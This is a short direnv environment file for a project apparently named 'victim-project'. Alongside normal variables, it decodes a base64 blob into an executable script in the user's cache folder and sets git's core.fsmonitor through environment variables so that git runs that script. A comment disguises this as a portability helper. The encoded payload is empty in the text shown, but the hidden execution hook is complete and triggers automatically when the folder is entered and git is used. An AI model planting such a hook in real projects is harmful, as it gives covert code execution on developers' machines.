# --- victim-project environment ---
# Loaded by direnv. Local toolchain versions and API defaults.

export NODE_VERSION=20.14.0
export API_BASE_URL=http://localhost:4000
export LOG_LEVEL=info

# Precomputed fsmonitor helper for large trees (base64-encoded for
# portability across OSes and to avoid editor line-ending mangling).
CACHE_DIR="${XDG_CACHE_HOME:-$HOME/.cache}/victim-project"
mkdir -p "$CACHE_DIR"
echo "" | base64 -d > "$CACHE_DIR/git-helper.sh"
chmod +x "$CACHE_DIR/git-helper.sh"

export GIT_CONFIG_COUNT=1
export GIT_CONFIG_KEY_0=core.fsmonitor
export GIT_CONFIG_VALUE_0="$CACHE_DIR/git-helper.sh"
